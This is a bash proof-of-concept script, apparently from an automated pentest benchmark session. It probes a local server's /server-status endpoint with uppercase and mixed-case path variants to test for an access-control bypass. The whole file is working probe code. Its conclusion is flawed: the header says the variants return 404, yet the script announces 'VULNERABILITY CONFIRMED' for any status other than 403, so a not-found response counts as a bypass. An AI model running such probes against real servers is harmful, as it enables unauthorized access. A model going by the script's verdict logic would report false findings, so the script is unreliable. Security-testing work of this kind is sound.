#!/bin/bash
# POC: Demonstrates access control bypass via case-sensitive path matching. Tests the /server-status endpoint with various case combinations to show that access control rules only match the exact lowercase path, returning 403 for /server-status but 404 for case variations like /Server-status, /SERVER-STATUS, etc.
# Target: ./repo
# Created: 2025-11-07T17:10:58.755Z
# Session: benchmark-XBEN-066-24-mhp3k0ub

# Access Control Bypass via Case Sensitivity in Path Matching
# This script demonstrates that access control rules are case-sensitive
# and can be bypassed by using different case variations of the path

TARGET="${1:-http://localhost:32768}"
ENDPOINT="/server-status"

echo "==============================================="
echo "Access Control Bypass - Case Sensitivity Test"
echo "==============================================="
echo "Target: $TARGET"
echo ""

# Test 1: Exact lowercase path (should be 403)
echo "[Test 1] Exact lowercase path: $ENDPOINT"
RESPONSE1=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n-1)
echo "HTTP Status: $HTTP_CODE1"
echo ""

# Test 2: Uppercase S
echo "[Test 2] Uppercase S: /Server-status"
RESPONSE2=$(curl -s -w "\n%{http_code}" "$TARGET/Server-status")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)
echo "HTTP Status: $HTTP_CODE2"
echo ""

# Test 3: All uppercase
echo "[Test 3] All uppercase: /SERVER-STATUS"
RESPONSE3=$(curl -s -w "\n%{http_code}" "$TARGET/SERVER-STATUS")
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
BODY3=$(echo "$RESPONSE3" | head -n-1)
echo "HTTP Status: $HTTP_CODE3"
echo ""

# Test 4: Mixed case
echo "[Test 4] Mixed case: /Server-Status"
RESPONSE4=$(curl -s -w "\n%{http_code}" "$TARGET/Server-Status")
HTTP_CODE4=$(echo "$RESPONSE4" | tail -n1)
BODY4=$(echo "$RESPONSE4" | head -n-1)
echo "HTTP Status: $HTTP_CODE4"
echo ""

# Analysis
echo "==============================================="
echo "ANALYSIS"
echo "==============================================="

if [ "$HTTP_CODE1" = "403" ]; then
    echo "✓ Lowercase path returns 403 Forbidden (access control active)"
else
    echo "✗ Lowercase path returns $HTTP_CODE1 (unexpected)"
fi

BYPASS_FOUND=0
for i in 2 3 4; do
    var_name="HTTP_CODE$i"
    http_code="${!var_name}"
    if [ "$http_code" != "403" ] && [ "$http_code" != "$HTTP_CODE1" ]; then
        echo "✓ Case variation returns different status ($http_code), possible bypass"
        BYPASS_FOUND=1
    fi
done

echo ""
if [ "$BYPASS_FOUND" = "1" ]; then
    echo "VULNERABILITY CONFIRMED: Access control is case-sensitive"
    echo "Different case variations return different HTTP status codes"
    echo "This indicates access control rules only match exact case paths"
    exit 0
else
    echo "Behavior is consistent - all variations behave the same way"
    exit 1
fi